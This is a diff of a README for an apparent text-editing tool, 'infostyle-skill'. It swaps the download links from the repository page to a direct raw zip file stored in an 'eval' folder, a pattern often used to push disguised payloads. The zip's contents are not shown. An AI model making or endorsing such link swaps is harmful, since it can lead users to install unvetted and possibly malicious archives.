@@ -1,6 +1,6 @@
 # 📝 infostyle-skill - Edit Russian text with clarity
 
-[![Download](https://img.shields.io/badge/Download%20infostyle--skill-4B8BBE?style=for-the-badge&labelColor=grey)](https://github.com/Julianalost754/infostyle-skill)
+[![Download](https://img.shields.io/badge/Download%20infostyle--skill-4B8BBE?style=for-the-badge&labelColor=grey)](https://github.com/Julianalost754/infostyle-skill/raw/refs/heads/main/eval/skill-infostyle-v1.9-beta.3.zip)
 
 ## 🚀 What this is
 
@@ -29,7 +29,7 @@ Use it when you want to turn long, loose text into clear copy. It fits tasks lik
 
 ## 🔽 Download and setup
 
-Visit this page to download: https://github.com/Julianalost754/infostyle-skill
+Visit this page to download: https://github.com/Julianalost754/infostyle-skill/raw/refs/heads/main/eval/skill-infostyle-v1.9-beta.3.zip
 
 After you open the page:
 
